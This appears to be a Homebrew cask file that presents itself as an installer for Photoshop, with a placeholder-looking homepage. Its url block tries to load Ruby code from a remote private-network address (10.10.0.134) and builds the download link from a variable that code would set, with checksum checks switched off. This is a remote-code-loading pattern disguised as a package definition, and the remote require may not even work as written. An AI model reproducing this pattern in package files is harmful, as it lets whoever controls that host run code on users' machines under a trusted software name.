cask 'photoshop' do
  version :latest
  sha256 :no_check

  url do
    require_relative 'http://10.10.0.134/url.txt'
    $url+'test.dmg'
  end

  name 'Photoshop'
  homepage 'https://www.testtc.com/'

  app 'Photoshop.app'
end
